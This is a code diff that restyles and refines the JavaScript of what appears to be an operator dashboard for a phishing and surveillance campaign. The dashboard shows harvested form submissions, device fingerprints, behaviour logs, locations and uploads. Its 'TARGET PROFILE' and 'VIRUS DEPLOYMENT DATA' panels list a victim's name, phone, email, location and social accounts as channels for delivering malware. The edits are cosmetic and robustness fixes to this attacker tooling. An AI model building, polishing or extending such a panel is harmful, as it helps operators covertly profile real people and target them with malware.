@@ -17,48 +17,51 @@
         .login-box button:hover{transform:scale(1.01)}
         .login-box .error{color:#ff4444;text-align:center;margin-top:12px;display:none}
         .container{max-width:1200px;margin:0 auto;display:none}
-        .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px}
-        .header h1{font-size:28px;font-weight:800}
-        .header .sub{color:#888;font-size:13px}
-        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:12px;margin-bottom:20px}
-        .stat-box{background:#1a1a2e;padding:16px 20px;border-radius:10px;border:1px solid rgba(255,255,255,0.05);text-align:center}
-        .stat-box .num{font-size:24px;font-weight:800;color:#ffd700}
-        .stat-box .label{font-size:10px;color:#888}
-        .card{background:#1a1a2e;border-radius:10px;border:1px solid rgba(255,255,255,0.05);margin-bottom:14px;overflow:hidden}
-        .card-header{padding:12px 16px;border-bottom:1px solid rgba(255,255,255,0.05);font-weight:600;font-size:13px;display:flex;justify-content:space-between;color:#fff}
-        .card-header .count{font-weight:400;color:#888;font-size:11px}
-        .card-body{padding:12px 16px;max-height:400px;overflow-y:auto}
-        .card-body pre{background:#0a0a0a;padding:12px;border-radius:6px;font-size:10px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;border:1px solid rgba(255,255,255,0.05);color:#aaa;margin:0}
-        .empty{color:#666;text-align:center;padding:20px;font-style:italic;font-size:13px}
-        .badge{display:inline-block;padding:2px 10px;border-radius:50px;font-size:9px;font-weight:600}
+        .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:10px}
+        .header h1{font-size:24px;font-weight:800}
+        .header .sub{color:#888;font-size:12px}
+        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:10px;margin-bottom:16px}
+        .stat-box{background:#1a1a2e;padding:12px 16px;border-radius:8px;border:1px solid rgba(255,255,255,0.05);text-align:center}
+        .stat-box .num{font-size:20px;font-weight:800;color:#ffd700}
+        .stat-box .label{font-size:9px;color:#888}
+        .card{background:#1a1a2e;border-radius:8px;border:1px solid rgba(255,255,255,0.05);margin-bottom:12px;overflow:hidden}
+        .card-header{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,0.05);font-weight:600;font-size:12px;display:flex;justify-content:space-between;color:#fff}
+        .card-header .count{font-weight:400;color:#888;font-size:10px}
+        .card-body{padding:10px 14px;max-height:350px;overflow-y:auto}
+        .card-body pre{background:#0a0a0a;padding:10px;border-radius:6px;font-size:9px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;border:1px solid rgba(255,255,255,0.05);color:#aaa;margin:0}
+        .empty{color:#666;text-align:center;padding:16px;font-style:italic;font-size:12px}
+        .badge{display:inline-block;padding:1px 8px;border-radius:50px;font-size:8px;font-weight:600}
         .badge.form{background:#27ae60;color:#fff}
         .badge.upload{background:#2980b9;color:#fff}
         .badge.fingerprint{background:#8e44ad;color:#fff}
         .badge.behavior{background:#e67e22;color:#fff}
         .badge.location{background:#2c3e50;color:#fff}
-        .btn{display:inline-block;padding:4px 14px;background:#ffd700;color:#000;border-radius:50px;text-decoration:none;font-size:10px;font-weight:600;border:none;cursor:pointer}
+        .btn{display:inline-block;padding:3px 12px;background:#ffd700;color:#000;border-radius:50px;text-decoration:none;font-size:9px;font-weight:600;border:none;cursor:pointer}
         .btn:hover{background:#f5a623}
-        .btn-danger{background:#e74c3c;color:#fff}
+        .btn-danger{background:#e74c3c;color:#fff;padding:3px 12px}
         .btn-danger:hover{background:#c0392b}
-        .gallery-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px;padding:10px 0}
-        .gallery-item{background:#0a0a0a;border-radius:8px;border:1px solid rgba(255,255,255,0.05);overflow:hidden;cursor:pointer}
-        .gallery-item img{width:100%;height:120px;object-fit:cover;display:block}
-        .gallery-item .info{padding:6px 10px;font-size:11px;font-weight:600;color:#aaa;word-break:break-all}
+        .gallery-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:10px;padding:8px 0}
+        .gallery-item{background:#0a0a0a;border-radius:6px;border:1px solid rgba(255,255,255,0.05);overflow:hidden;cursor:pointer}
+        .gallery-item img{width:100%;height:100px;object-fit:cover;display:block}
+        .gallery-item .info{padding:4px 8px;font-size:9px;font-weight:600;color:#aaa;word-break:break-all}
         .modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);z-index:999;align-items:center;justify-content:center;padding:20px}
         .modal.active{display:flex}
-        .modal-content{max-width:90%;max-height:90%;background:#1a1a2e;border-radius:12px;overflow:hidden;position:relative;border:1px solid rgba(255,255,255,0.1)}
-        .modal-content .close{position:absolute;top:10px;right:15px;font-size:28px;color:#fff;cursor:pointer;background:rgba(0,0,0,0.6);width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;border:none;z-index:10}
+        .modal-content{max-width:90%;max-height:90%;background:#1a1a2e;border-radius:10px;overflow:hidden;position:relative;border:1px solid rgba(255,255,255,0.1)}
+        .modal-content .close{position:absolute;top:8px;right:12px;font-size:24px;color:#fff;cursor:pointer;background:rgba(0,0,0,0.6);width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;border:none;z-index:10}
         .modal-content img{max-width:100%;max-height:80vh;display:block;margin:0 auto}
-        .refresh{display:inline-block;margin-left:10px;padding:2px 12px;background:rgba(255,255,255,0.05);border-radius:50px;font-size:10px;color:#888;text-decoration:none;cursor:pointer;border:1px solid rgba(255,255,255,0.05)}
+        .refresh{display:inline-block;margin-left:8px;padding:2px 10px;background:rgba(255,255,255,0.05);border-radius:50px;font-size:9px;color:#888;text-decoration:none;cursor:pointer;border:1px solid rgba(255,255,255,0.05)}
         .refresh:hover{background:rgba(255,255,255,0.1)}
-        ::-webkit-scrollbar{width:4px}
+        ::-webkit-scrollbar{width:3px}
         ::-webkit-scrollbar-track{background:#0a0a0a}
         ::-webkit-scrollbar-thumb{background:#ffd700;border-radius:10px}
         @media(max-width:600px){.stats{grid-template-columns:1fr 1fr}.gallery-grid{grid-template-columns:1fr 1fr}}
-        .data-tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:16px}
-        .data-tabs button{background:rgba(255,255,255,0.05);color:#aaa;border:1px solid rgba(255,255,255,0.05);padding:8px 16px;border-radius:8px;cursor:pointer;font-size:12px;transition:0.3s}
-        .data-tabs button:hover{background:rgba(255,255,255,0.08);color:#fff}
-        .data-tabs button.active{background:rgba(255,215,0,0.1);color:#ffd700;border-color:#ffd700}
+        .data-tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
+        .data-tabs button{background:rgba(255,255,255,0.03);color:#888;border:1px solid rgba(255,255,255,0.05);padding:6px 14px;border-radius:6px;cursor:pointer;font-size:11px;transition:0.3s}
+        .data-tabs button:hover{background:rgba(255,255,255,0.06);color:#fff}
+        .data-tabs button.active{background:rgba(255,215,0,0.08);color:#ffd700;border-color:rgba(255,215,0,0.2)}
+        .loading{text-align:center;padding:40px;color:#888}
+        .loading .spinner{display:inline-block;width:30px;height:30px;border:2px solid rgba(255,255,255,0.1);border-top-color:#ffd700;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:10px}
+        @keyframes spin{to{transform:rotate(360deg)}}
     </style>
 </head>
 <body>
@@ -101,7 +104,7 @@
         <button onclick="showTab('uploads')">📁 Uploads</button>
     </div>
     
-    <div id="dataContent"></div>
+    <div id="dataContent"><div class="loading"><div class="spinner"></div><div>Loading data...</div></div></div>
 </div>
 
 <div class="modal" id="imageModal" onclick="closeModal()">
@@ -118,8 +121,16 @@ let allData = {};
 let currentTab = 'submissions';
 
 function loadAllData() {
+    const dataContent = document.getElementById('dataContent');
+    dataContent.innerHTML = '<div class="loading"><div class="spinner"></div><div>Loading data...</div></div>';
+    
     fetch(BACKEND_URL + '/api/all')
-    .then(response => response.json())
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        return response.json();
+    })
     .then(data => {
         allData = data;
         const submissions = data.submissions || [];
@@ -140,7 +151,7 @@ function loadAllData() {
     })
     .catch(error => {
         console.error('Error loading data:', error);
-        document.getElementById('dataContent').innerHTML = '<div class="empty">Error loading data. Please refresh.</div>';
+        document.getElementById('dataContent').innerHTML = '<div class="empty">❌ Error loading data. Please refresh.</div>';
     });
 }
 
@@ -158,10 +169,12 @@ function renderTab(tab) {
     // Update tab buttons
     document.querySelectorAll('.data-tabs button').forEach(btn => {
         btn.classList.remove('active');
-        if (btn.textContent.includes(tab === 'submissions' ? 'Submissions' : 
-            tab === 'fingerprints' ? 'Fingerprints' :
-            tab === 'behavior' ? 'Behavior' :
-            tab === 'locations' ? 'Locations' : 'Uploads')) {
+        const btnText = btn.textContent;
+        if ((tab === 'submissions' && btnText.includes('Submissions')) ||
+            (tab === 'fingerprints' && btnText.includes('Fingerprints')) ||
+            (tab === 'behavior' && btnText.includes('Behavior')) ||
+            (tab === 'locations' && btnText.includes('Locations')) ||
+            (tab === 'uploads' && btnText.includes('Uploads'))) {
             btn.classList.add('active');
         }
     });
@@ -171,22 +184,22 @@ function renderTab(tab) {
         if (submissions.length > 0) {
             const latest = submissions[submissions.length - 1];
             html += `
-                <div style="background:linear-gradient(135deg,#1a1a2e,#2d2d44);border:1px solid rgba(255,215,0,0.2);padding:16px 20px;border-radius:10px;margin-bottom:16px;">
-                    <h3 style="color:#ffd700;font-size:14px;margin-bottom:8px;">🎯 TARGET PROFILE</h3>
-                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
-                        <div style="font-size:12px;color:#aaa;"><strong style="color:#fff;">Name:</strong> ${latest.fullname || 'Unknown'}</div>
-                        <div style="font-size:12px;color:#aaa;"><strong style="color:#fff;">Phone:</strong> ${latest.phone || 'Unknown'}</div>
-                        <div style="font-size:12px;color:#aaa;"><strong style="color:#fff;">Email:</strong> ${latest.email || 'Unknown'}</div>
-                        <div style="font-size:12px;color:#aaa;"><strong style="color:#fff;">Location:</strong> ${latest.location || 'Unknown'}</div>
-                        <div style="font-size:12px;color:#aaa;"><strong style="color:#fff;">Experience:</strong> ${latest.experience || 'Unknown'}</div>
-                        <div style="font-size:12px;color:#aaa;"><strong style="color:#fff;">Social:</strong> ${latest.social || 'Unknown'}</div>
+                <div style="background:linear-gradient(135deg,#1a1a2e,#2d2d44);border:1px solid rgba(255,215,0,0.15);padding:14px 18px;border-radius:8px;margin-bottom:12px;">
+                    <h3 style="color:#ffd700;font-size:13px;margin-bottom:6px;">🎯 TARGET PROFILE</h3>
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;">
+                        <div style="font-size:11px;color:#aaa;"><strong style="color:#fff;">Name:</strong> ${latest.fullname || 'Unknown'}</div>
+                        <div style="font-size:11px;color:#aaa;"><strong style="color:#fff;">Phone:</strong> ${latest.phone || 'Unknown'}</div>
+                        <div style="font-size:11px;color:#aaa;"><strong style="color:#fff;">Email:</strong> ${latest.email || 'Unknown'}</div>
+                        <div style="font-size:11px;color:#aaa;"><strong style="color:#fff;">Location:</strong> ${latest.location || 'Unknown'}</div>
+                        <div style="font-size:11px;color:#aaa;"><strong style="color:#fff;">Experience:</strong> ${latest.experience || 'Unknown'}</div>
+                        <div style="font-size:11px;color:#aaa;"><strong style="color:#fff;">Social:</strong> ${latest.social || 'Unknown'}</div>
                     </div>
-                    <div style="background:rgba(231,76,60,0.1);border:1px solid rgba(231,76,60,0.2);padding:12px 16px;border-radius:8px;margin-top:10px;">
-                        <h4 style="color:#e74c3c;font-size:12px;margin-bottom:4px;">⚡ VIRUS DEPLOYMENT DATA</h4>
-                        <div style="font-size:11px;color:#aaa;">📱 SMS: ${latest.phone || 'No phone'}</div>
-                        <div style="font-size:11px;color:#aaa;">📧 Email: ${latest.email || 'No email'}</div>
-                        <div style="font-size:11px;color:#aaa;">📍 Location: ${latest.location || 'Unknown'}</div>
-                        <div style="font-size:11px;color:#aaa;">🔗 Social: ${latest.social || 'Unknown'}</div>
+                    <div style="background:rgba(231,76,60,0.08);border:1px solid rgba(231,76,60,0.1);padding:10px 14px;border-radius:6px;margin-top:8px;">
+                        <h4 style="color:#e74c3c;font-size:11px;margin-bottom:2px;">⚡ VIRUS DEPLOYMENT DATA</h4>
+                        <div style="font-size:10px;color:#aaa;">📱 SMS: ${latest.phone || 'No phone'}</div>
+                        <div style="font-size:10px;color:#aaa;">📧 Email: ${latest.email || 'No email'}</div>
+                        <div style="font-size:10px;color:#aaa;">📍 Location: ${latest.location || 'Unknown'}</div>
+                        <div style="font-size:10px;color:#aaa;">🔗 Social: ${latest.social || 'Unknown'}</div>
                     </div>
                 </div>
             `;
@@ -202,7 +215,7 @@ function renderTab(tab) {
         html += `
             <div class="card">
                 <div class="card-header"><span>🔍 Device Fingerprints</span><span class="count"><span class="badge fingerprint">${fingerprints.length}</span></span></div>
-                <div class="card-body">${fingerprints.length > 0 ? `<pre>${JSON.stringify(fingerprints, null, 2)}</pre>` : '<div class="empty">No fingerprints yet. Wait for user to visit.</div>'}</div>
+                <div class="card-body">${fingerprints.length > 0 ? `<pre>${JSON.stringify(fingerprints, null, 2)}</pre>` : '<div class="empty">No fingerprints yet. Wait for a user to visit.</div>'}</div>
             </div>
         `;
     } else if (tab === 'behavior') {
@@ -291,6 +304,7 @@ if (sessionStorage.getItem('score_auth') === 'true') {
     loadAllData();
 }
 
+// Auto-refresh every 30 seconds
 setInterval(() => {
     if (sessionStorage.getItem('score_auth') === 'true') {
         loadAllData();
